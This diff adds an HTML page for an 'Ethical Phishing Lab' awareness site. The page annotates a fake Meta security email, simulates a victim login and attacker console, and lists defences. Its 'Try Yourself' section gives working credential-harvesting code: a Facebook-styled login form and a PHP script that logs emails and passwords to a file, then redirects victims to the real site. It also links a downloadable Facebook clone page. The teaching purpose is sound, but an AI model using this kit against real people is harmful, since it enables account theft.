@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ethical Phishing Lab | Interactive Simulation</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&family=Space+Grotesk:wght@300;500;700&display=swap"
+        rel="stylesheet">
+</head>
+
+<body>
+    <div class="cursor-glow"></div>
+    <div class="grid-background"></div>
+
+    <nav class="glass-nav">
+        <div class="logo">PHISH<span>LAB</span></div>
+        <ul class="nav-links">
+            <li><a href="../index.html">← Back to Hub</a></li>
+            <li><a href="#anatomy" class="active">Anatomy</a></li>
+            <li><a href="#simulate">Simulate</a></li>
+            <li><a href="#console">Console</a></li>
+            <li><a href="#try-yourself">Try Yourself</a></li>
+        </ul>
+    </nav>
+
+    <main class="container">
+        <header class="lab-header fade-in">
+            <h1>Ethical Phishing Simulation</h1>
+            <p class="warning-banner">⚠️ <strong>EDUCATIONAL USE ONLY</strong>: This lab demonstrates how phishing works
+                to help you better defend against it. Never use these techniques for malicious purposes.</p>
+        </header>
+
+        <!-- Module 1: Anatomy of a Phish -->
+        <section id="anatomy" class="lab-section fade-in">
+            <h2 class="section-title">Step 1: Anatomy of a Phish</h2>
+            <div class="glass-card email-simulator">
+                <div class="email-header">
+                    <p><strong>From:</strong> <span class="phish-trigger"
+                            data-tip="Look closely: 'noreply@facebookmail.com' instead of 'support@facebook.com'">Security
+                            Update &lt;noreply@facebookmail.com&gt;</span></p>
+                    <p><strong>Subject:</strong> <span class="phish-trigger"
+                            data-tip="Urgency is a common tactic to make victims act without thinking.">URGENT:
+                            Suspicious Login Detected!</span></p>
+                </div>
+                <div class="email-body">
+                    <p>Dear User,</p>
+                    <p>We detected an unusual login attempt on your account from IP: 202.168.103.104 (Moscow, RU).</p>
+                    <p>If this was not you, please secure your account immediately by clicking the button below:</p>
+                    <div class="cta-container">
+                        <button class="phish-trigger cta-btn"
+                            data-tip="Hover to see the real URL. In a real phish, this might point to a look-alike domain.">Secure
+                            My Account</button>
+                    </div>
+                    <p>Failure to respond within 24 hours will result in temporary account suspension.</p>
+                    <p>Thank you,<br>The Meta Support Team</p>
+                </div>
+            </div>
+            <div id="tip-display" class="glass-card tip-box">
+                <p>💡 Hover over highlighted parts of the email to see why they are suspicious.</p>
+            </div>
+        </section>
+
+        <!-- Module 2: The Hook -->
+        <section id="simulate" class="lab-section fade-in">
+            <h2 class="section-title">Step 2: The Hook (Live Simulation)</h2>
+            <div class="sim-grid">
+                <div class="glass-card mock-login">
+                    <h3>Victim's View</h3>
+                    <p class="sm-text">This is what the victim sees after clicking the link.</p>
+                    <div class="fake-form-container fb-style">
+                        <div class="fb-logo">facebook</div>
+                        <div class="fb-card">
+                            <div class="input-group">
+                                <input type="text" id="victim-user" placeholder="Email address or phone number">
+                            </div>
+                            <div class="input-group">
+                                <input type="password" id="victim-pass" placeholder="Password">
+                            </div>
+                            <button id="submit-trap" class="fb-login-btn">Log In</button>
+                            <div class="fb-links">
+                                <a href="#">Forgotten password?</a>
+                            </div>
+                            <div class="fb-divider"></div>
+                            <div class="fb-create-container">
+                                <button class="fb-create-btn">Create new account</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div id="console" class="glass-card attacker-console">
+                    <h3>Attacker's Console</h3>
+                    <p class="sm-text">Real-time data capture simulation.</p>
+                    <div class="terminal">
+                        <div class="terminal-line">> Waiting for victim interaction...</div>
+                        <div id="captured-data"></div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Module 3: Defense -->
+        <section id="defense" class="lab-section fade-in">
+            <h2 class="section-title">How to Protect Yourself</h2>
+            <div class="malware-grid">
+                <div class="glass-card defense-card">
+                    <div class="icon">🔍</div>
+                    <h3>Check the Sender</h3>
+                    <p>Always verify the sender's email address, not just the display name.</p>
+                </div>
+                <div class="glass-card defense-card">
+                    <div class="icon">🔗</div>
+                    <h3>Inspect Links</h3>
+                    <p>Hover over links to see the destination URL before clicking.</p>
+                </div>
+                <div class="glass-card defense-card">
+                    <div class="icon">🔒</div>
+                    <h3>Enable MFA</h3>
+                    <p>Multi-Factor Authentication adds a critical second layer of defense.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- New: Try Yourself Section -->
+        <section id="try-yourself" class="lab-section fade-in">
+            <h2 class="section-title">Try Yourself:</h2>
+            <p class="section-intro">Follow these steps to create your own ethical phishing simulation in a local
+                environment.</p>
+
+            <div class="glass-card guide-container">
+                <div class="guide-tabs">
+                    <button class="tab-btn active" data-tab="step1">1. The Login Page</button>
+                    <button class="tab-btn" data-tab="step2">2. The PHP Script</button>
+                    <button class="tab-btn" data-tab="step3">3. Viewing Results</button>
+                </div>
+
+                <div class="tab-content active" id="step1">
+                    <h3>Step 1: Create the HTML Login Page</h3>
+                    <p>Create a file named <code>index.html</code>. This is the "Hook" that the victim visits. It must
+                        look identical to a real login page to be effective.</p>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span>index.html</span>
+                            <button class="copy-btn">Copy</button>
+                        </div>
+                        <pre><code>&lt;form action="login.php" method="POST"&gt;
+    &lt;h2&gt;Login to Facebook&lt;/h2&gt;
+    &lt;input type="text" name="email" placeholder="Email or Phone" required&gt;
+    &lt;input type="password" name="pass" placeholder="Password" required&gt;
+    &lt;button type="submit"&gt;Log In&lt;/button&gt;
+&lt;/form&gt;</code></pre>
+                    </div>
+                    <div class="download-container">
+                        <p class="sm-text">Need a starting point? Download our high-fidelity demo:</p>
+                        <a href="facebook.html" download="facebook.html" class="modal-btn download-btn">
+                            <span>📥</span> Download Demo Page
+                        </a>
+                    </div>
+
+                </div>
+
+                <div class="tab-content" id="step2">
+                    <h3>Step 2: Create the PHP Theft Script</h3>
+                    <p>Create a file named <code>login.php</code>. This script "thefts" (captures) the POST data and
+                        redirects the victim to prevent suspicion.</p>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span>login.php</span>
+                            <button class="copy-btn">Copy</button>
+                        </div>
+                        <pre><code>&lt;?php
+// 1. Capture the data
+$email = $_POST['email'];
+$pass = $_POST['pass'];
+
+// 2. Save it to a local file
+$file = fopen("usernames.txt", "a");
+fwrite($file, "Email: " . $email . " | Pass: " . $pass . "\n");
+fclose($file);
+
+// 3. Redirect to the REAL website
+header("Location: https://www.facebook.com/login");
+exit();
+?&gt;</code></pre>
+                    </div>
+                </div>
+
+                <div class="tab-content" id="step3">
+                    <h3>Step 3: Saving and Showing Results</h3>
+                    <p>When the victim submits the form, their data is saved in <code>usernames.txt</code>. You can view
+                        this file on your server to see the "captured" credentials.</p>
+                    <div class="results-preview">
+                        <div class="code-header">
+                            <span>usernames.txt (Example Output)</span>
+                        </div>
+                        <pre class="terminal-text">Email: victim@example.com | Pass: P@ssw0rd123
+Email: john.doe@mail.com | Pass: 123456</pre>
+                    </div>
+                    <div class="alert-box warning">
+                        <strong>Important:</strong> Only perform this on your own accounts or with explicit permission.
+                        Stealing real credentials is a serious cybercrime.
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <p>&copy; 2026 Ethical Phishing Lab | Avanish Kumar</p>
+    </footer>
+
+    <!-- Custom Educational Modal -->
+    <div id="edu-modal" class="modal-overlay">
+        <div class="modal-content glass-card">
+            <div class="modal-header">
+                <span class="modal-icon">💡</span>
+                <h3>Educational Insight</h3>
+            </div>
+            <div class="modal-body">
+                <p>In a real attack, the victim would now be redirected to the real Facebook website, unaware that their
+                    credentials were just stolen.</p>
+            </div>
+            <div class="modal-footer">
+                <button id="close-modal" class="modal-btn">I Understand</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+
+</html>
